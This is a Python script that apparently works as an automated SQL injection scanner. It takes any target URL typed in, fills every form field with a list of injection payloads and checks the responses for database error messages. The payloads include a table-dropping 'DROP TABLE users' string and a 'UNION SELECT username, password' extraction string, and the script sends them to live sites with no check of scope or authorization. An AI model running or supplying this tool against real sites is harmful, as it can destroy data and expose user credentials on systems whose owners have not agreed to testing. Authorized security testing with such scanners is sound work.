import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# List of SQL injection payloads
payloads = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR '1'='1' ({",
    "' OR '1'='1' /*",
    "' OR SLEEP(5)--",
    "' OR 1=1#",
    "' OR 'a'='a",
    "' OR 1=1--",
    "' OR 1=1/*",
    "' OR 1=1;%00",
    "' OR 'unusual'='unusual'",
    "'; DROP TABLE users; --",
    "' UNION SELECT NULL--",
    "' UNION SELECT username, password FROM users--",
    "' AND '1'='1",
    "' AND 1=1--",
    "' AND 1=0--",
    "' OR 1=0--",
    "' OR x=x--",
    "' OR x=y--",
    "\" OR \"a\"=\"a",
    "' OR ''='",
    "' OR 1=1 LIMIT 1--",
    "') OR ('1'='1",
    "') OR ('1'='1' --",
]

# Common SQL error messages to detect
error_messages = [
    "you have an error in your sql syntax;",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "mysql_fetch",
    "syntax error",
    "ORA-01756",
    "SQLSTATE",
    "Microsoft OLE DB Provider for ODBC Drivers",
    "ODBC Microsoft Access Driver",
    "Unhandled Exception",
    "Fatal error",
    "JDBC Driver",
    "mysql_num_rows()",
    "Input string was not in a correct format",
    "pg_query()",
    "supplied argument is not a valid MySQL result resource",
    "java.sql.SQLException",
    "XPathException",
    "Incorrect syntax near",
    "Invalid Querystring",
    "ADODB.Field error",
    "Invalid SQL statement",
    "OLE DB Provider",
    "VBScript Runtime",
    "ADODB.Command error",
    "Operation must use an updateable query",
    "ORA-00933",
    "ORA-00921",
    "ORA-00936",
    "ORA-01756",
]

def scan_sql_injection(url):
    # Send a GET request to the URL
    print(f"Scanning {url} for SQL Injection vulnerabilities...")
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')

    # Find all forms on the page
    forms = soup.find_all('form')
    print(f"Detected {len(forms)} form(s) on {url}")

    # Iterate through each form
    for i, form in enumerate(forms, start=1):
        action = form.get('action')
        method = form.get('method', 'get').lower()

        # Handle relative URLs in form action
        action_url = urljoin(url, action)
        print(f"\nForm #{i}:")
        print(f"Form action URL: {action_url}")
        print(f"Form method: {method}")

        inputs = form.find_all(['input', 'textarea', 'select'])
        input_names = [input.get('name') for input in inputs if input.get('name')]

        print(f"Input fields found: {input_names}")

        # Prepare form data dictionary
        form_data = {}
        for input_field in inputs:
            input_name = input_field.get('name')
            input_type = input_field.get('type')
            if input_name:
                form_data[input_name] = ""

        # Test each input field with each payload
        for payload in payloads:
            for input_name in input_names:
                # Clone the form data and inject the payload
                data = form_data.copy()
                data[input_name] = payload

                print(f"\nTesting field '{input_name}' with payload: {payload}")

                # Send the request based on the form method
                if method == 'post':
                    result = requests.post(action_url, data=data)
                else:
                    result = requests.get(action_url, params=data)

                # Check for SQL errors in the response
                for error_message in error_messages:
                    if error_message.lower() in result.text.lower():
                        print(f"[!] Potential SQL Injection vulnerability detected in '{input_name}'")
                        print(f"Payload: {payload}")
                        print(f"Error Message Detected: {error_message}")
                        print(f"Response Snippet: {result.text.strip()[:200]}")
                        break  # Stop checking error messages if one is found
                else:
                    print(f"No SQL Injection detected for '{input_name}' with payload: {payload}")

    print("\nScanning completed.")

# Example usage
if __name__ == "__main__":
    target_url = input("Enter target URL: ")
    scan_sql_injection(target_url)
